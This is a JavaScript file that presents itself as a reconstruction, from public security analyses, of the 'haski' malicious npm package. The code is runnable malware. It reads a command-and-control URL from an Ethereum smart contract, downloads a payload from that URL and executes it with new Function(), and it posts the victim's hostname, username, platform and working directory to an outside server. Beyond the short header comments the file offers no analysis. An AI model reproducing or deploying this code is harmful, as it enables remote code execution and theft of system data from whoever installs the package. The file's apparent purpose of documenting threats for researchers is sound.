// haski — reconstructed from public security analyses
// Source: https://checkmarx.com/blog/new-technique-to-hide-malicious-npm-packages-using-ethereum-blockchain/
//
// 2024: Novel technique using Ethereum smart contracts as a C2 channel.
// The package reads a smart contract on the blockchain to retrieve the URL
// of the actual malicious payload, making takedown much harder since
// blockchain data is immutable.
//
// Technique: Blockchain-based C2 + dynamic payload retrieval + eval execution

const https = require("https");
const os = require("os");
const { exec } = require("child_process");

// Ethereum JSON-RPC call to read smart contract storage
// The contract address stores the C2 URL in its state
var CONTRACT_ADDRESS = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";

function readContractData(callback) {
  // eth_call to read contract storage slot 0 (stores the C2 URL)
  var rpcPayload = JSON.stringify({
    jsonrpc: "2.0",
    method: "eth_call",
    params: [{
      to: CONTRACT_ADDRESS,
      data: "0x20965255"  // getValue() function selector
    }, "latest"],
    id: 1
  });

  var req = https.request({
    hostname: "cloudflare-eth.com",
    path: "/",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(rpcPayload)
    }
  }, function(res) {
    var data = "";
    res.on("data", function(chunk) { data += chunk; });
    res.on("end", function() {
      try {
        var result = JSON.parse(data);
        // Decode hex response to get the URL
        var hex = result.result.replace("0x", "");
        // Skip first 64 chars (offset) and next 64 chars (length), then decode
        var urlHex = hex.slice(128);
        var url = "";
        for (var i = 0; i < urlHex.length; i += 2) {
          var byte = parseInt(urlHex.substr(i, 2), 16);
          if (byte === 0) break;
          url += String.fromCharCode(byte);
        }
        callback(null, url);
      } catch(e) {
        callback(e);
      }
    });
  });

  req.write(rpcPayload);
  req.end();
}

// Fetch and execute the payload from C2 URL
function fetchAndExecute(url) {
  https.get(url, function(res) {
    var payload = "";
    res.on("data", function(chunk) { payload += chunk; });
    res.on("end", function() {
      // Execute retrieved payload
      new Function(payload)();
    });
  });
}

// Collect system info for fingerprinting
function fingerprint() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    pid: process.pid,
    cwd: process.cwd()
  };
}

// Main: read C2 URL from blockchain, then fetch and execute payload
readContractData(function(err, url) {
  if (!err && url) {
    fetchAndExecute(url);
  }
});

// Also directly exfiltrate system info as fallback
var info = JSON.stringify(fingerprint());
var req = https.request({
  hostname: "evm-blockchain-api.herokuapp.com",
  path: "/api/data",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(info)
  }
});
req.write(info);
req.end();
